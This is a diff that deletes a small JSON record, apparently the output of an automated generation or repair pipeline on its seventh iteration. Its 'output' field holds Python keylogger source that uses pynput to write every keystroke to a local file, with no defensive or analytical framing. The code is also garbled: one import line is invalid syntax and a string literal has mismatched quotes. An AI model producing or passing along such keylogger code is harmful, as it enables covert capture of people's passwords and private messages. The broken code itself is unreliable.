@@ -1,8 +1,0 @@
-{
-  "output": "import pynput\n\nf from pynput.keyboard import Listener, Key\n\ndef on_press(key):\n    with open('keylogs.txt', 'a') as f:\n        try:\n            char = str(key).strip(\"'})\n            if len(char) == 1:\n                f.write(char)\n            elif key in [Key.space, Key.enter]:\n                special_keys = {Key.space: '[SPACE]', Key.enter: '[ENTER]'}\n                f.write(special_keys[key])\n            else:\n                f.write(' [{}]'.format(char)) \n        except Exception as e:\n            print(e)\ndef on_release(key):\n    if key == Key.esc:\n        return False\nwith Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
-  "notes": "Fixed JSON formatting issues.",
-  "applied_fixes": [
-    "iteration6_issue1"
-  ],
-  "iterations": 7
-}
